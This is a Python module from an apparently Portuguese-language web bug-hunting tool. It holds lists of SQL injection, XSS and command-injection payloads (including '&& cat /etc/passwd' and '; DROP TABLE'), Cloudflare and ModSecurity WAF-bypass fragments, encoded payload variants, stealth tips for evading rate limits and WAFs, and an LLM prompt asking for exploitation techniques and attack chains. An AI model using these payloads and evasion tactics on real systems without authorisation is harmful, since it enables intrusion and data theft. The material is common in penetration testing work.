"""
AEGIS Bug Hunter - AI Interpreter
Módulo de IA interpretativa para análise de padrões e sugestões
"""

import os
import json
import re
import requests
from datetime import datetime
from collections import Counter

try:
    import openai
    OPENAI_AVAILABLE = True
except ImportError:
    OPENAI_AVAILABLE = False
    openai = None

class AIInterpreter:
    def __init__(self):
        self.openai_client = None
        self.vulnerability_patterns = {}
        self.payload_database = {}
        self.init_ai_client()
        self.load_knowledge_base()
    
    def init_ai_client(self):
        """Inicializa cliente OpenAI se disponível"""
        try:
            if not OPENAI_AVAILABLE:
                print(f"[ai_interpreter] ⚠️ OpenAI não disponível, usando análise local")
                return
                
            # Verifica se as variáveis de ambiente estão configuradas
            api_key = os.getenv('OPENAI_API_KEY')
            api_base = os.getenv('OPENAI_API_BASE')
            
            if api_key:
                self.openai_client = openai.OpenAI(
                    api_key=api_key,
                    base_url=api_base if api_base else None
                )
                print(f"[ai_interpreter] 🤖 Cliente OpenAI inicializado")
            else:
                print(f"[ai_interpreter] ⚠️ OpenAI não configurado, usando análise local")
        except Exception as e:
            print(f"[ai_interpreter] ⚠️ Erro ao inicializar OpenAI: {str(e)}")
    
    def load_knowledge_base(self):
        """Carrega base de conhecimento de vulnerabilidades"""
        self.vulnerability_patterns = {
            "sql_injection": {
                "indicators": [
                    "sql syntax", "mysql_fetch", "ora-01756", "postgresql query failed",
                    "warning: mysql", "syntax error", "database error", "sqlite_step"
                ],
                "common_payloads": [
                    "' OR '1'='1", "\" OR \"1\"=\"1", "'; DROP TABLE", "' UNION SELECT",
                    "admin'--", "1' AND 1=1--", "1' AND 1=2--"
                ],
                "advanced_techniques": [
                    "time-based blind", "boolean-based blind", "union-based",
                    "error-based", "stacked queries"
                ]
            },
            "xss": {
                "indicators": [
                    "script executed", "alert displayed", "javascript executed",
                    "dom manipulation", "cookie theft"
                ],
                "common_payloads": [
                    "<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>",
                    "javascript:alert(1)", "<svg onload=alert(1)>", "'\"><script>alert(1)</script>"
                ],
                "advanced_techniques": [
                    "dom-based xss", "stored xss", "reflected xss",
                    "filter bypass", "csp bypass"
                ]
            },
            "command_injection": {
                "indicators": [
                    "uid=", "gid=", "groups=", "root:", "/bin/bash",
                    "command not found", "ping statistics", "ls output"
                ],
                "common_payloads": [
                    "; ls", "| whoami", "&& cat /etc/passwd", "; cat /etc/passwd",
                    "`whoami`", "$(whoami)", "; ping -c 1 127.0.0.1"
                ],
                "advanced_techniques": [
                    "blind command injection", "time-based detection",
                    "output redirection", "command chaining"
                ]
            }
        }
        
        self.payload_database = {
            "encoding_techniques": [
                "url_encoding", "html_encoding", "unicode_encoding",
                "base64_encoding", "hex_encoding"
            ],
            "bypass_techniques": [
                "case_variation", "comment_insertion", "whitespace_manipulation",
                "concatenation", "function_substitution"
            ],
            "waf_bypasses": {
                "cloudflare": [
                    "/**/", "/*!*/", "union/**/select", "un/**/ion",
                    "sel/**/ect", "%0a", "%0d", "%09"
                ],
                "modsecurity": [
                    "/*!50000*/", "/*!12345*/", "/*+*/", "/**_**/",
                    "union%0aselect", "union%0dselect"
                ]
            }
        }
    
    def analyze_vulnerability_context(self, vulnerability_data):
        """Analisa contexto das vulnerabilidades encontradas"""
        context_analysis = {
            "vulnerability_types": [],
            "attack_vectors": [],
            "target_characteristics": {},
            "exploitation_difficulty": "medium"
        }
        
        if not vulnerability_data.get("vulnerabilidades_encontradas"):
            return context_analysis
        
        vulns = vulnerability_data["vulnerabilidades_encontradas"]
        
        # Analisa tipos de vulnerabilidades
        vuln_types = [v.get("tipo_injecao", v.get("tipo", "")) for v in vulns]
        context_analysis["vulnerability_types"] = list(set(vuln_types))
        
        # Analisa vetores de ataque
        attack_vectors = []
        for vuln in vulns:
            if vuln.get("tipo") == "parametro_url":
                attack_vectors.append("url_parameter")
            elif vuln.get("tipo") == "formulario":
                attack_vectors.append("form_input")
            elif vuln.get("tipo") == "header_injection":
                attack_vectors.append("http_header")
        
        context_analysis["attack_vectors"] = list(set(attack_vectors))
        
        # Analisa características do alvo
        context_analysis["target_characteristics"] = {
            "total_vulnerabilities": len(vulns),
            "high_confidence_vulns": len([v for v in vulns if v.get("confianca", 0) > 0.8]),
            "critical_vulns": len([v for v in vulns if v.get("tipo_injecao") in ["sql_injection", "command_injection"]])
        }
        
        # Determina dificuldade de exploração
        if context_analysis["target_characteristics"]["critical_vulns"] > 0:
            context_analysis["exploitation_difficulty"] = "easy"
        elif context_analysis["target_characteristics"]["high_confidence_vulns"] > 2:
            context_analysis["exploitation_difficulty"] = "medium"
        else:
            context_analysis["exploitation_difficulty"] = "hard"
        
        return context_analysis
    
    def generate_advanced_payloads(self, vuln_type, context=None):
        """Gera payloads avançados baseados no tipo e contexto"""
        if vuln_type not in self.vulnerability_patterns:
            return []
        
        base_payloads = self.vulnerability_patterns[vuln_type]["common_payloads"]
        advanced_payloads = []
        
        # Aplica técnicas de encoding
        for payload in base_payloads[:3]:  # Limita para não gerar muitos
            # URL encoding
            url_encoded = payload.replace("'", "%27").replace('"', "%22").replace(" ", "%20")
            advanced_payloads.append({
                "payload": url_encoded,
                "technique": "url_encoding",
                "description": "URL encoded version of base payload"
            })
            
            # Double encoding
            double_encoded = url_encoded.replace("%", "%25")
            advanced_payloads.append({
                "payload": double_encoded,
                "technique": "double_encoding",
                "description": "Double URL encoded payload"
            })
            
            # Case variation (para XSS)
            if vuln_type == "xss":
                case_varied = payload.replace("script", "ScRiPt").replace("alert", "ALeRt")
                advanced_payloads.append({
                    "payload": case_varied,
                    "technique": "case_variation",
                    "description": "Case variation to bypass filters"
                })
        
        # Adiciona payloads específicos por tipo
        if vuln_type == "sql_injection":
            advanced_payloads.extend([
                {
                    "payload": "1' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
                    "technique": "version_detection",
                    "description": "MySQL version detection"
                },
                {
                    "payload": "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                    "technique": "schema_enumeration",
                    "description": "Schema enumeration attempt"
                }
            ])
        
        elif vuln_type == "xss":
            advanced_payloads.extend([
                {
                    "payload": "<svg/onload=alert(String.fromCharCode(88,83,83))>",
                    "technique": "string_construction",
                    "description": "String construction to bypass filters"
                },
                {
                    "payload": "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycpOw=='))>",
                    "technique": "base64_execution",
                    "description": "Base64 encoded JavaScript execution"
                }
            ])
        
        return advanced_payloads
    
    def suggest_attack_strategies(self, target_data):
        """Sugere estratégias de ataque baseadas nos dados do alvo"""
        strategies = {
            "recommended_approaches": [],
            "payload_suggestions": {},
            "timing_recommendations": {},
            "stealth_techniques": []
        }
        
        # Analisa dados de defesa se disponíveis
        defenses = target_data.get("defesas_detectadas", [])
        waf_detected = any("WAF" in d.get("tipo", "") for d in defenses)
        rate_limit_detected = any("Rate Limiting" in d.get("tipo", "") for d in defenses)
        
        # Recomendações baseadas nas defesas
        if waf_detected:
            strategies["recommended_approaches"].append("Use encoding and obfuscation techniques")
            strategies["stealth_techniques"].extend([
                "Rotate User-Agents frequently",
                "Use random delays between requests",
                "Fragment payloads across multiple parameters"
            ])
        
        if rate_limit_detected:
            strategies["timing_recommendations"] = {
                "min_delay": 2.0,
                "max_delay": 5.0,
                "burst_limit": 3
            }
        
        # Analisa vulnerabilidades encontradas
        vulns = target_data.get("vulnerabilidades_encontradas", [])
        vuln_types = list(set([v.get("tipo_injecao", v.get("tipo", "")) for v in vulns]))
        
        for vuln_type in vuln_types:
            if vuln_type in self.vulnerability_patterns:
                strategies["payload_suggestions"][vuln_type] = self.generate_advanced_payloads(vuln_type)
        
        return strategies
    
    def analyze_with_ai(self, target_data, context):
        """Usa IA para análise avançada se disponível"""
        if not self.openai_client:
            return self._fallback_analysis(target_data, context)
        
        try:
            # Prepara prompt para análise
            prompt = self._create_analysis_prompt(target_data, context)
            
            response = self.openai_client.chat.completions.create(
                model="gpt-3.5-turbo",
                messages=[
                    {"role": "system", "content": "You are a cybersecurity expert specializing in web application penetration testing and vulnerability analysis."},
                    {"role": "user", "content": prompt}
                ],
                max_tokens=1000,
                temperature=0.7
            )
            
            ai_analysis = response.choices[0].message.content
            
            return {
                "ai_analysis": ai_analysis,
                "source": "openai",
                "confidence": 0.8
            }
            
        except Exception as e:
            print(f"[ai_interpreter] ⚠️ Erro na análise com IA: {str(e)}")
            return self._fallback_analysis(target_data, context)
    
    def _create_analysis_prompt(self, target_data, context):
        """Cria prompt para análise com IA"""
        vulns_summary = []
        if target_data.get("vulnerabilidades_encontradas"):
            for vuln in target_data["vulnerabilidades_encontradas"][:5]:  # Limita para não exceder tokens
                vulns_summary.append(f"- {vuln.get('tipo_injecao', vuln.get('tipo', 'Unknown'))}: {vuln.get('evidencia', 'No evidence')}")
        
        prompt = f"""
Analyze the following web application security assessment results and provide insights:

TARGET: {target_data.get('target_url', 'Unknown')}

VULNERABILITIES FOUND:
{chr(10).join(vulns_summary) if vulns_summary else 'No vulnerabilities detected'}

CONTEXT:
- Vulnerability types: {', '.join(context.get('vulnerability_types', []))}
- Attack vectors: {', '.join(context.get('attack_vectors', []))}
- Exploitation difficulty: {context.get('exploitation_difficulty', 'unknown')}

Please provide:
1. Risk assessment and prioritization
2. Advanced exploitation techniques for the found vulnerabilities
3. Recommendations for further testing
4. Potential attack chains that could be constructed

Keep the response focused and technical.
"""
        return prompt
    
    def _fallback_analysis(self, target_data, context):
        """Análise local quando IA não está disponível"""
        analysis = {
            "risk_assessment": self._assess_risk_locally(target_data, context),
            "exploitation_techniques": self._suggest_exploitation_techniques(context),
            "testing_recommendations": self._generate_testing_recommendations(context),
            "source": "local_analysis",
            "confidence": 0.6
        }
        
        return analysis
    
    def _assess_risk_locally(self, target_data, context):
        """Avaliação de risco local"""
        vulns = target_data.get("vulnerabilidades_encontradas", [])
        
        if not vulns:
            return "LOW - No vulnerabilities detected"
        
        critical_vulns = [v for v in vulns if v.get("tipo_injecao") in ["sql_injection", "command_injection"]]
        high_vulns = [v for v in vulns if v.get("tipo_injecao") in ["xss", "file_inclusion"]]
        
        if critical_vulns:
            return f"CRITICAL - {len(critical_vulns)} critical vulnerabilities found"
        elif high_vulns:
            return f"HIGH - {len(high_vulns)} high-risk vulnerabilities found"
        else:
            return f"MEDIUM - {len(vulns)} vulnerabilities found"
    
    def _suggest_exploitation_techniques(self, context):
        """Sugere técnicas de exploração"""
        techniques = []
        
        for vuln_type in context.get("vulnerability_types", []):
            if vuln_type in self.vulnerability_patterns:
                techniques.extend(self.vulnerability_patterns[vuln_type]["advanced_techniques"])
        
        return list(set(techniques))
    
    def _generate_testing_recommendations(self, context):
        """Gera recomendações de teste"""
        recommendations = []
        
        if "sql_injection" in context.get("vulnerability_types", []):
            recommendations.extend([
                "Perform manual SQL injection testing with advanced payloads",
                "Test for blind SQL injection using time-based techniques",
                "Enumerate database schema and extract sensitive data"
            ])
        
        if "xss" in context.get("vulnerability_types", []):
            recommendations.extend([
                "Test for stored XSS in all input fields",
                "Attempt DOM-based XSS exploitation",
                "Test XSS filter bypass techniques"
            ])
        
        if "command_injection" in context.get("vulnerability_types", []):
            recommendations.extend([
                "Test for blind command injection",
                "Attempt privilege escalation",
                "Test for file system access"
            ])
        
        return recommendations

def executar(target_url):
    """Executa análise com IA interpretativa"""
    print(f"[ai_interpreter] 🤖 Iniciando análise com IA para: {target_url}")
    
    try:
        ai = AIInterpreter()
        
        # Carrega dados dos módulos anteriores
        site_name = target_url.replace('https://', '').replace('http://', '').replace('/', '_')
        output_dir = f"output/{site_name}"
        
        # Compila dados para análise
        target_data = {"target_url": target_url}
        
        # Carrega vulnerabilidades
        injects_file = f"{output_dir}/injects.json"
        if os.path.exists(injects_file):
            with open(injects_file, 'r', encoding='utf-8') as f:
                injects_data = json.load(f)
                target_data.update(injects_data)
        
        # Carrega defesas
        defense_file = f"{output_dir}/defense_analysis.json"
        if os.path.exists(defense_file):
            with open(defense_file, 'r', encoding='utf-8') as f:
                defense_data = json.load(f)
                target_data["defesas_detectadas"] = defense_data.get("defesas_detectadas", [])
        
        # Analisa contexto
        context = ai.analyze_vulnerability_context(target_data)
        
        # Gera estratégias de ataque
        strategies = ai.suggest_attack_strategies(target_data)
        
        # Análise com IA
        ai_analysis = ai.analyze_with_ai(target_data, context)
        
        resultado = {
            "target_url": target_url,
            "timestamp": datetime.now().isoformat(),
            "context_analysis": context,
            "attack_strategies": strategies,
            "ai_insights": ai_analysis,
            "advanced_payloads": {},
            "recommendations": {
                "immediate_actions": [],
                "further_testing": [],
                "exploitation_paths": []
            }
        }
        
        # Gera payloads avançados para cada tipo de vulnerabilidade
        for vuln_type in context["vulnerability_types"]:
            if vuln_type:
                resultado["advanced_payloads"][vuln_type] = ai.generate_advanced_payloads(vuln_type, context)
        
        # Gera recomendações finais
        if context["target_characteristics"]["critical_vulns"] > 0:
            resultado["recommendations"]["immediate_actions"].append("Address critical vulnerabilities immediately")
        
        if context["exploitation_difficulty"] == "easy":
            resultado["recommendations"]["exploitation_paths"].append("Target is highly exploitable - proceed with caution")
        
        # Salva resultado
        arquivo_saida = f"{output_dir}/ai_analysis.json"
        with open(arquivo_saida, "w", encoding="utf-8") as f:
            json.dump(resultado, f, indent=4, ensure_ascii=False)
        
        print(f"[ai_interpreter] ✅ Análise com IA concluída")
        print(f"[ai_interpreter] 🎯 Tipos de vulnerabilidade: {len(context['vulnerability_types'])}")
        print(f"[ai_interpreter] 🧠 Fonte da análise: {ai_analysis.get('source', 'unknown')}")
        print(f"[ai_interpreter] 💾 Resultado salvo em: {arquivo_saida}")
        
        return resultado
        
    except Exception as e:
        print(f"[ai_interpreter] ❌ Erro na análise com IA: {str(e)}")
        return {"erro": str(e)}

